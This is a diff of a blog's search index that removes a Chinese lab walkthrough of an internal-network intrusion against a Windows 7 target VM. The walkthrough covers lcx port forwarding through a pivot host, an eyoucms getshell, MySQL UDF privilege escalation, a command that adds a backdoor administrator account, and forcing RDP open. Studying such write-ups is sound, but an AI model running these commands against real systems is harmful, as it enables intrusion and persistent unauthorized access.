@@ -924,37 +924,6 @@
     
     
     <entry>
-      <title>内网渗透之Win7提权</title>
-      <link href="/posts/37b2a9ba.html"/>
-      <url>/posts/37b2a9ba.html</url>
-      
-        <content type="html"><![CDATA[<h3 id="用到的工具及环境"><a href="#用到的工具及环境" class="headerlink" title="用到的工具及环境"></a>用到的工具及环境</h3><ul><li>强开3389（内网强开3389神器）</li><li>法克抓包工具（内网抓包改包）</li><li>Scanport（小型端口扫描器）</li><li>Mysql</li><li>Windows Server 2003（内网跳板）</li><li>Windows 7（目标靶机）</li></ul><h3 id="上传Scanport"><a href="#上传Scanport" class="headerlink" title="上传Scanport"></a>上传Scanport</h3><p>利用菜刀，将Scanport上传到03服务器上：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614766614961.png" alt="enter description here"></p><p>这里我们还是利用之前的lcx进行一个内网穿透，然后本机访问1234进行远程登陆：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614767533958.png" alt="enter description here"></p><p>在跳板上运行Scanport，之前传的竟然不支持64位，问题不大，我们传一个64位的上去运行一下即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614767885308.png" alt="enter description here"></p><p>扫描发现内网192.168.192.130开放80端口，接下来的工作就是渗透这个192.168.192.130:80服务器了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614768028727.png" alt="enter description here"></p><h3 id="内网Web渗透"><a href="#内网Web渗透" class="headerlink" title="内网Web渗透"></a>内网Web渗透</h3><p>内网中的Win 7虽然开放了80端口，但仅仅是内网访问，并没有映射到公网上，所以我们得先用03上的lcx将Win 7的80端口映射到我们的攻击机上</p><pre class="line-numbers language-cmd"><code class="language-cmd">Windows 10：lcx.exe -listen 8888 88Windows 2003：lcx.exe -slave 192.168.1.103 8888 192.168.192.130 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这一波操作完，我们访问127.0.0.1:88就能够成功杀入内网对这台基于Win7搭建的Web服务器进行渗透了~渗透最关键的当然是信息收集，这里发现是用eyoucms搭建的，那我们就先去网上搜一下，看看有没有现成的exp可以用：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614781070147.png" alt=""></p><p>网上一搜还是很多的，我们就用这个经典的eyoucms 1.0前台Getshell漏洞吧，具体的漏洞成因本文不做过多介绍，<a href="https://blog.csdn.net/weixin_44897902/article/details/103435905" target="_blank" rel="noopener">详情参考这里</a>。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614770599039.png" alt="enter description here"></p><p>这里先测试下是否存在漏洞：</p><pre><code>访问 http://127.0.0.1:88/index.php/api/Uploadify/preview</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614781249715.png" alt="enter description here"></p><p>很好，漏洞存在，接下来我们用法克抓包进行POST数据，配置好参数直接发包，shell的地址会在返回包中：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614783065207.png" alt="enter description here"></p><p>我们直接菜刀连接，成功拿下，接下来就是用经典的Mysql UDF提权：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614783474758.png" alt="enter description here"></p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>先来看一下用Mysql UDF提权的条件：</p><ul><li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li><li>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</li><li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li><li>拥有可以将udf.dll写入相应目录的权限。</li></ul><p>查看一下3306端口是否存在：</p><pre class="line-numbers language-cmd"><code class="language-cmd">netstat -ant | find "3306"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614784147446.png" alt="enter description here"></p><p>我们接着回到菜刀，去找一下网站数据库的配置文件，看下数据库的密码是什么：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614784599554.png" alt="enter description here"></p><pre><code>账号：root密码：root</code></pre><p>一切准备就绪后，传一个写好的UDF提权工具，Web访问一下，因为我这里已经传了一个免杀的udf.dll，所以会提示“导出DLL文件出错：File ‘C:MySQLlibpluginudf.dll’ already exists”<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614787969352.png" alt="enter description here"></p><p>接着我们给肉鸡传一个Mysql.exe，用肉鸡去远程登陆Mysql执行命令：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614788220368.png" alt="enter description here"></p><p>回到3389，登陆Win 7的Mysql：</p><pre class="line-numbers language-cmd"><code class="language-cmd">mysql.exe -uadmin -h 192.168.192.130 -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614788529276.png" alt="enter description here"></p><p>成功登录以后，创建cmdshell函数：</p><pre class="line-numbers language-php"><code class="language-php">Create <span class="token keyword">Function</span> cmdshell returns string soname <span class="token string">'udf.dll'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行系统命令：</p><pre class="line-numbers language-php"><code class="language-php">select <span class="token function">cmdshell</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614788643158.png" alt="enter description here"></p><p>可以看到这里是最高权限了，接着创建用户：</p><pre class="line-numbers language-php"><code class="language-php">select <span class="token function">cmdshell</span><span class="token punctuation">(</span><span class="token string">'net user hack Passwd123+ /add &amp;&amp; net localgroup administrators hack /add'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614788757584.png" alt="enter description here"></p><p>但是Win 7并没有开放3389，我们只能传一个强开3389，然后在菜刀中运行一下：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614789591648.png" alt="enter description here"></p><p>很好，接下来用肉鸡做一个端口转发，尝试远程登陆这台Win 7：</p><pre><code>Windows 10：lcx.exe -listen 4444 3388Windows 2003：lcx.exe -slave 192.168.1.103 4444 192.168.192.130 3389</code></pre><p>最后，本地连接3388端口，输入账号密码静待30秒，抓鸡完毕：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://qpe0nkrlt.hd-bkt.clouddn.com/1614790053331.png" alt="enter description here"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试篇 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 渗透测试 </tag>
-            
-            <tag> 域渗透 </tag>
-            
-            <tag> 内网渗透 </tag>
-            
-            <tag> 提权 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>内网渗透之Win2003提权</title>
       <link href="/posts/d03e3fa0.html"/>
       <url>/posts/d03e3fa0.html</url>
@@ -2085,9 +2054,9 @@
             
             <tag> PHP </tag>
             
-            <tag> CSRF </tag>
-            
             <tag> 渗透测试 </tag>
+            
+            <tag> CSRF </tag>
             
         </tags>
       
@@ -2147,9 +2116,9 @@
             
             <tag> PHP </tag>
             
-            <tag> 渗透测试 </tag>
-            
             <tag> 伪协议 </tag>
+            
+            <tag> 渗透测试 </tag>
             
         </tags>
       
